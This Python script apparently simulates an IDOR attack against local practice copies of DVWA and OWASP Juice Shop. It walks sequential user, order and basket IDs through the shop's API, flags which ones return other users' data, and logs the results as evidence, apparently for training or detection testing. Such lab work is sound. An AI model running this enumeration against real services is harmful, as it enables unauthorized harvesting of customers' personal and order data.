#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object Reference) Attack Simulation
"""

import requests
import time
import json
from datetime import datetime

DVWA_URL = "http://localhost:8080"
JUICE_SHOP_URL = "http://localhost:3000"
LOG_FILE = "simulations/idor/evidence/attack_log.json"

class IDORSimulation:
    def __init__(self):
        self.session = requests.Session()
        self.attack_log = []

    def phase1_user_enumeration(self):
        """Enumerate user profiles by iterating IDs"""
        print("\n[*] Phase 1: User ID Enumeration (Juice Shop)")

        for user_id in range(1, 20):
            resp = self.session.get(
                f"{JUICE_SHOP_URL}/api/Users/{user_id}"
            )
            self.attack_log.append({
                "timestamp": datetime.now().isoformat(),
                "type": "IDOR - User Enumeration",
                "target_id": user_id,
                "url": f"/api/Users/{user_id}",
                "status": resp.status_code,
                "data_exposed": resp.status_code == 200,
                "response_length": len(resp.text)
            })
            if resp.status_code == 200:
                print(f"  [!] User ID {user_id}: DATA EXPOSED ({len(resp.text)} bytes)")
            time.sleep(0.5)

    def phase2_order_access(self):
        """Access other users' orders"""
        print("\n[*] Phase 2: Accessing Other Users' Orders")

        for order_id in range(1, 15):
            resp = self.session.get(
                f"{JUICE_SHOP_URL}/api/Orders/{order_id}"
            )
            self.attack_log.append({
                "timestamp": datetime.now().isoformat(),
                "type": "IDOR - Order Access",
                "target_id": order_id,
                "url": f"/api/Orders/{order_id}",
                "status": resp.status_code,
                "data_exposed": resp.status_code == 200
            })
            time.sleep(0.5)

    def phase3_basket_manipulation(self):
        """Access/modify other users' baskets"""
        print("\n[*] Phase 3: Basket Manipulation")

        for basket_id in range(1, 10):
            resp = self.session.get(
                f"{JUICE_SHOP_URL}/rest/basket/{basket_id}"
            )
            self.attack_log.append({
                "timestamp": datetime.now().isoformat(),
                "type": "IDOR - Basket Access",
                "target_id": basket_id,
                "url": f"/rest/basket/{basket_id}",
                "status": resp.status_code,
                "data_exposed": resp.status_code == 200
            })
            time.sleep(0.5)

    def save_log(self):
        with open(LOG_FILE, 'w') as f:
            json.dump({"attacks": self.attack_log}, f, indent=2)
        print(f"\n[+] Log saved to {LOG_FILE}")

    def run(self):
        print("=" * 60)
        print("IDOR ATTACK SIMULATION")
        print("=" * 60)
        self.phase1_user_enumeration()
        self.phase2_order_access()
        self.phase3_basket_manipulation()
        self.save_log()

if __name__ == "__main__":
    IDORSimulation().run()
